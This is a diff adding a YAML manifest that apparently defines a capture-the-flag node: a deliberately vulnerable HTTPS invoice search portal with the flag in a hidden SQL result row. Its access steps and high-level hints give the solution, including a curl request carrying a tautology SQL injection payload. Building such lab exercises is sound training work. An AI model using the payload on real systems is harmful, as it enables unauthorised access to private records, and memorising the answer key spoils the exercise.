@@ -1,0 +1,83 @@
+manifest_version: 1
+id: '63'
+kind: flag-node-generator
+name: 'HTTPS: SQLi Invoice Portal'
+description: TLS invoice search portal with an injectable SQL query and finance-themed
+  records.
+hint_template: Probe the invoice search before moving to {{NEXT_NODE_NAME}}.
+runtime:
+  type: docker-compose
+  compose_file: docker-compose.yml
+  service: generator
+env:
+  WEB_VARIANT_ID: https_sqli_invoice_portal
+inputs:
+- name: seed
+  type: string
+  required: true
+- name: node_name
+  type: string
+  required: true
+- name: flag_prefix
+  type: string
+  required: false
+- name: web_port
+  type: number
+  required: false
+  default: 8443
+artifacts:
+  requires:
+  - Knowledge(ip)
+  produces:
+  - Flag(flag_id)
+  - FlagDelivery(mode)
+  - FlagFile(path)
+  - File(path)
+  - PortForward(host
+  - port)
+  - Directory(host
+  - path)
+  - Endpoint(path)
+  - Version(service)
+  - Vulnerability(host
+  - type)
+injects:
+- site
+inject_candidate_paths:
+- /var/www/invoices
+- /srv/https/invoices
+- /opt/finance/review
+- /home/www-data/invoices
+access_instructions:
+  title: SQL Injection in HTTPS Invoice Search
+  steps:
+  - step: 1
+    title: Open invoice search
+    instructions: '```bash
+
+      curl -k ''https://{{NODE}}:{{PORT}}/search?invoice=Acme%20Health''
+
+      ```
+
+      '
+  - step: 2
+    title: Use a tautology payload
+    instructions: '```bash
+
+      curl -k "https://{{NODE}}:{{PORT}}/search?invoice='' OR ''1''=''1"
+
+      ```
+
+      '
+  - step: 3
+    title: Record the hidden invoice row
+    instructions: Record the flag from the hidden SQL result row.
+hint_levels:
+  low:
+  - Probe the invoice search before moving to {{NEXT_NODE_NAME}}.
+  medium:
+  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  high:
+  - Open invoice search
+  - Use a tautology payload
+  - 'Record the hidden invoice row: Record the flag from the hidden SQL result row.'
